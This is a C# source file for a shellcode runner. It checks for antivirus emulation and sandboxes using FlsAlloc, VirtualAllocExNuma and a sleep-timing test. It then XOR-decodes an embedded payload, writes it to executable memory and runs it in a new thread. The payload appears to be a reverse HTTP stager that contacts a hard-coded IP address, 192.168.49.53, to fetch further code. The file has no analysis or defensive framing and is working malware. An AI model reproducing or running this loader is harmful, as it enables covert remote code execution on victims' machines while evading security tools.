using System; 
using System.Collections.Generic; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 

namespace ConsoleApp1 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred); 
        
        [DllImport("kernel32.dll")] 
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 

        [DllImport("kernel32.dll")] 
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 

        [DllImport("kernel32.dll")] 
        static extern void Sleep(uint dwMilliseconds); 

        [DllImport("kernel32.dll", SetLastError = true)] 
        static extern IntPtr FlsAlloc(IntPtr callback); 

        [DllImport("kernel32.dll")] 
        static extern IntPtr GetCurrentProcess(); 

        static void Main(string[] args) 
        { 
            IntPtr AllocFLS = FlsAlloc(IntPtr.Zero); 
            if (AllocFLS == null) 
            { 

                return; 

            } 
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); 

            if (mem == null)  //if the api is not emuated by the av the software will terminate 
            { 
                return; 
            } 
            DateTime t1 = DateTime.Now; 
            Sleep(2000); 

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds; 

            if (t2 < 1.5) 
            { 
                return; 
            } 

	    byte[] key = new byte[1] { 0xA0 };
            byte[] buf = new byte[] { 0x5c, 0xe8, 0x23, 0x44, 0x50, 0x48, 0x6c, 0xa0, 0xa0, 0xa0, 0xe1, 0xf1, 0xe1, 0xf0, 0xf2, 0xf1, 0xf6, 0xe8, 0x91, 0x72, 0xc5, 0xe8, 0x2b, 0xf2, 0xc0, 0xe8, 0x2b, 0xf2, 0xb8, 0xe8, 0x2b, 0xf2, 0x80, 0xed, 0x91, 0x69, 0xe8, 0x2b, 0xd2, 0xf0, 0xe8, 0xaf, 0x17, 0xea, 0xea, 0xe8, 0x91, 0x60, 0x0c, 0x9c, 0xc1, 0xdc, 0xa2, 0x8c, 0x80, 0xe1, 0x61, 0x69, 0xad, 0xe1, 0xa1, 0x61, 0x42, 0x4d, 0xf2, 0xe8, 0x2b, 0xf2, 0x80, 0x2b, 0xe2, 0x9c, 0xe8, 0xa1, 0x70, 0xc6, 0x21, 0xd8, 0xb8, 0xab, 0xa2, 0xe1, 0xf1, 0xaf, 0x25, 0xd2, 0xa0, 0xa0, 0xa0, 0x2b, 0x20, 0x28, 0xa0, 0xa0, 0xa0, 0xe8, 0x25, 0x60, 0xd4, 0xc7, 0xe8, 0xa1, 0x70, 0x2b, 0xe8, 0xb8, 0xf0, 0xe4, 0x2b, 0xe0, 0x80, 0xe9, 0xa1, 0x70, 0x43, 0xf6, 0xed, 0x91, 0x69, 0xe8, 0x5f, 0x69, 0xe1, 0x2b, 0x94, 0x28, 0xe8, 0xa1, 0x76, 0xe8, 0x91, 0x60, 0x0c, 0xe1, 0x61, 0x69, 0xad, 0xe1, 0xa1, 0x61, 0x98, 0x40, 0xd5, 0x51, 0xec, 0xa3, 0xec, 0x84, 0xa8, 0xe5, 0x99, 0x71, 0xd5, 0x78, 0xf8, 0xe4, 0x2b, 0xe0, 0x84, 0xe9, 0xa1, 0x70, 0xc6, 0xe1, 0x2b, 0xac, 0xe8, 0xe4, 0x2b, 0xe0, 0xbc, 0xe9, 0xa1, 0x70, 0xe1, 0x2b, 0xa4, 0x28, 0xe1, 0xf8, 0xe8, 0xa1, 0x70, 0xe1, 0xf8, 0xfe, 0xf9, 0xfa, 0xe1, 0xf8, 0xe1, 0xf9, 0xe1, 0xfa, 0xe8, 0x23, 0x4c, 0x80, 0xe1, 0xf2, 0x5f, 0x40, 0xf8, 0xe1, 0xf9, 0xfa, 0xe8, 0x2b, 0xb2, 0x49, 0xeb, 0x5f, 0x5f, 0x5f, 0xfd, 0xe8, 0x91, 0x7b, 0xf3, 0xe9, 0x1e, 0xd7, 0xc9, 0xce, 0xc9, 0xce, 0xc5, 0xd4, 0xa0, 0xe1, 0xf6, 0xe8, 0x29, 0x41, 0xe9, 0x67, 0x62, 0xec, 0xd7, 0x86, 0xa7, 0x5f, 0x75, 0xf3, 0xf3, 0xe8, 0x29, 0x41, 0xf3, 0xfa, 0xed, 0x91, 0x60, 0xed, 0x91, 0x69, 0xf3, 0xf3, 0xe9, 0x1a, 0x9a, 0xf6, 0xd9, 0x07, 0xa0, 0xa0, 0xa0, 0xa0, 0x5f, 0x75, 0x48, 0xae, 0xa0, 0xa0, 0xa0, 0x91, 0x99, 0x92, 0x8e, 0x91, 0x96, 0x98, 0x8e, 0x94, 0x99, 0x8e, 0x95, 0x93, 0xa0, 0xfa, 0xe8, 0x29, 0x61, 0xe9, 0x67, 0x60, 0x1b, 0xa1, 0xa0, 0xa0, 0xed, 0x91, 0x69, 0xf3, 0xf3, 0xca, 0xa3, 0xf3, 0xe9, 0x1a, 0xf7, 0x29, 0x3f, 0x66, 0xa0, 0xa0, 0xa0, 0xa0, 0x5f, 0x75, 0x48, 0x70, 0xa0, 0xa0, 0xa0, 0x8f, 0x8d, 0xcb, 0x90, 0xc5, 0xec, 0xe3, 0xe6, 0xef, 0xfa, 0xd7, 0xcc, 0xf8, 0xeb, 0xf6, 0xf9, 0xd2, 0xee, 0xd3, 0xc5, 0xd9, 0xd6, 0xc7, 0x94, 0xd2, 0xcd, 0x96, 0xf8, 0xf2, 0xef, 0xec, 0xe2, 0xea, 0xe9, 0xd7, 0x8d, 0xee, 0x8d, 0xcb, 0x92, 0xc2, 0xff, 0xfa, 0xce, 0xe6, 0xff, 0x92, 0xe7, 0xf9, 0xd4, 0xf2, 0xed, 0xcc, 0xd8, 0xf5, 0xcf, 0xcf, 0xe8, 0xd7, 0xf3, 0xd6, 0xd2, 0xf1, 0xc4, 0xf6, 0xcb, 0xf8, 0x97, 0xd5, 0xce, 0xe7, 0xc2, 0xe2, 0xcb, 0xf4, 0xf9, 0xe8, 0xf1, 0xce, 0xc8, 0xc8, 0x93, 0xf7, 0xc3, 0xc8, 0xc2, 0xf5, 0xff, 0xce, 0xea, 0xe9, 0xf8, 0xd4, 0xc1, 0xca, 0xea, 0xe4, 0xe3, 0xcf, 0xd8, 0xd7, 0xef, 0xf1, 0xcf, 0xc4, 0x96, 0xf7, 0x99, 0xd3, 0x99, 0xc6, 0xcb, 0xec, 0xe9, 0xce, 0x97, 0xc8, 0x95, 0xc9, 0x97, 0xf8, 0xf3, 0xd1, 0xd4, 0xd7, 0xda, 0xf5, 0xda, 0xeb, 0xd4, 0xeb, 0x90, 0xef, 0x92, 0xe9, 0x99, 0xc5, 0x98, 0x93, 0xcb, 0xf1, 0x94, 0xd4, 0xc4, 0xee, 0x99, 0xc9, 0xc9, 0xeb, 0x92, 0x91, 0xd2, 0xfa, 0xef, 0xda, 0x8d, 0xd4, 0xe8, 0x92, 0xe2, 0xd3, 0xe2, 0xe9, 0xc5, 0x97, 0x90, 0xe6, 0xda, 0xf3, 0xcb, 0xc9, 0x90, 0x98, 0xe8, 0xd8, 0x92, 0xd1, 0xeb, 0xd6, 0xd3, 0xd6, 0x97, 0xd8, 0xda, 0xca, 0x94, 0xc7, 0x94, 0xeb, 0xda, 0xd6, 0xda, 0xce, 0xe6, 0xe2, 0xf7, 0x91, 0x91, 0xc8, 0xf7, 0xef, 0xef, 0xf8, 0xe7, 0xc6, 0xc9, 0xf5, 0xa0, 0xe8, 0x29, 0x61, 0xf3, 0xfa, 0xe1, 0xf8, 0xed, 0x91, 0x69, 0xf3, 0xe8, 0x18, 0xa0, 0x92, 0x08, 0x24, 0xa0, 0xa0, 0xa0, 0xa0, 0xf0, 0xf3, 0xf3, 0xe9, 0x67, 0x62, 0x4b, 0xf5, 0x8e, 0x9b, 0x5f, 0x75, 0xe8, 0x29, 0x66, 0xca, 0xaa, 0xff, 0xe8, 0x29, 0x51, 0xca, 0xbf, 0xfa, 0xf2, 0xc8, 0x20, 0x93, 0xa0, 0xa0, 0xe9, 0x29, 0x40, 0xca, 0xa4, 0xe1, 0xf9, 0xe9, 0x1a, 0xd5, 0xe6, 0x3e, 0x26, 0xa0, 0xa0, 0xa0, 0xa0, 0x5f, 0x75, 0xed, 0x91, 0x60, 0xf3, 0xfa, 0xe8, 0x29, 0x51, 0xed, 0x91, 0x69, 0xed, 0x91, 0x69, 0xf3, 0xf3, 0xe9, 0x67, 0x62, 0x8d, 0xa6, 0xb8, 0xdb, 0x5f, 0x75, 0x25, 0x60, 0xd5, 0xbf, 0xe8, 0x67, 0x61, 0x28, 0xb3, 0xa0, 0xa0, 0xe9, 0x1a, 0xe4, 0x50, 0x95, 0x40, 0xa0, 0xa0, 0xa0, 0xa0, 0x5f, 0x75, 0xe8, 0x5f, 0x6f, 0xd4, 0xa2, 0x4b, 0x0a, 0x48, 0xf5, 0xa0, 0xa0, 0xa0, 0xf3, 0xf9, 0xca, 0xe0, 0xfa, 0xe9, 0x29, 0x71, 0x61, 0x42, 0xb0, 0xe9, 0x67, 0x60, 0xa0, 0xb0, 0xa0, 0xa0, 0xe9, 0x1a, 0xf8, 0x04, 0xf3, 0x45, 0xa0, 0xa0, 0xa0, 0xa0, 0x5f, 0x75, 0xe8, 0x33, 0xf3, 0xf3, 0xe8, 0x29, 0x47, 0xe8, 0x29, 0x51, 0xe8, 0x29, 0x7a, 0xe9, 0x67, 0x60, 0xa0, 0x80, 0xa0, 0xa0, 0xe9, 0x29, 0x59, 0xe9, 0x1a, 0xb2, 0x36, 0x29, 0x42, 0xa0, 0xa0, 0xa0, 0xa0, 0x5f, 0x75, 0xe8, 0x23, 0x64, 0x80, 0x25, 0x60, 0xd4, 0x12, 0xc6, 0x2b, 0xa7, 0xe8, 0xa1, 0x63, 0x25, 0x60, 0xd5, 0x72, 0xf8, 0x63, 0xf8, 0xca, 0xa0, 0xf9, 0xe9, 0x67, 0x62, 0x50, 0x15, 0x02, 0xf6, 0x5f, 0x75,  }; 

            for (int i = 0; i < buf.Length; i++) 
            { 
		buf[i] = (byte)(key[0] ^ (uint)buf[i]);
            } 
            int size = buf.Length; 
            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(),IntPtr.Zero, 0x1000, 0x3000, 0x40,0); 
            Sleep(2000);
	    Marshal.Copy(buf, 0, addr, size);
	    Sleep(2000); 
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); 
            WaitForSingleObject(hThread, 0xFFFFFFFF); 

        } 
    } 
} 
